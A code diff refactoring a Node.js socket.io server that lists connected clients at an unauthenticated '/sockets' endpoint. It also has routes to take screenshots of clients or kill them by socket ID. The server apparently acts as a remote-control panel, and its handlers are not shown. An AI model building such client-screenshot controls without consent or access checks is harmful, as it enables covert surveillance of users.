@@ -1,7 +1,5 @@
 const { Tree } = require('./Tree.js')
 const { Server } = require("socket.io");
-const { Konsole } = require('./Konsole.js')
-const colors = require('colors')
 const fs = require('fs')
 const express = require('express')
 const app = express()
@@ -18,25 +16,16 @@ app.use('/docs', (req, res) => {
 })
 
 app.use('/dl', express.static('download'))
-app.use('/', express.static('public'))
 app.use('/cdn', express.static('assets'))
+app.use('/', express.static('public'))
 
 const server = app.listen(3000)
 const io = new Server(server)
 
 let socket_infos = []
 
-function freshData() {
-  
-  app.use('/sockets', (req, res) => {
-    res.set('Content-Type', 'application/json');
-    let string = JSON.stringify(socket_infos)
-    res.send(Buffer.from(string));
-  })
-  
-}
-
 function getSocketById(id) {
+  
   let sockets = io.sockets.sockets
   
   if (sockets.has(id)) {
@@ -45,6 +34,14 @@ function getSocketById(id) {
 
   return false
 }
+
+app.use('/sockets', (req, res) => {
+  
+  res.set('Content-Type', 'application/json');
+  let string = JSON.stringify(socket_infos)
+  res.send(Buffer.from(string));
+  
+})
 
 app.get('/do/screenshot/:socketId', (req, res) => {
   
@@ -108,14 +105,14 @@ app.get('/do/kill/:socketId', (req, res) => {
 })
 
 io.on('connection', socket => {
-
-  io.to(socket.id).emit('info')
   
   socket.on('socket_info', infos => {
     infos.id = socket.id
     socket_infos.push(infos)
   })
+
+  socket.on('disconnect', () => {
+    socket_infos.splice(socket_infos.indexOf(socket_infos.find(x => x.id == socket.id)), 1)
+  })
   
 })
-
-freshData()
